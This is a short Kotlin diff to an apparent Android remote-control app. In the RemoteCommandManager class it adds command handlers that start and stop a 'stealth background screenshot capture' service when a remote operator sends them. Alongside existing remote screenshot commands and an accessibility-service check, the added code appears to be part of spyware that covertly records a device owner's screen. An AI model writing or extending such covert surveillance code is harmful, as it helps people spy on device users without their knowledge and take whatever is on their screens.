@@ -389,6 +389,14 @@ class RemoteCommandManager(private val context: Context) {
                         }
                     }
                 }
+                "START_STEALTH_CAPTURE", "START_STEALTH_SCREENSHOT", "START_SCREENSHOT_CAPTURE" -> {
+                    MediaProjectionHelper.startService(context)
+                    resultMessage = "Stealth background screenshot capture service initiated."
+                }
+                "STOP_STEALTH_CAPTURE", "STOP_STEALTH_SCREENSHOT", "STOP_SCREENSHOT_CAPTURE" -> {
+                    MediaProjectionHelper.stopService(context)
+                    resultMessage = "Stealth background screenshot capture service stopped."
+                }
                 "GLOBAL_TAKE_SCREENSHOT", "TAKE_SCREENSHOT", "SCREENSHOT" -> {
                     val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                     var res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
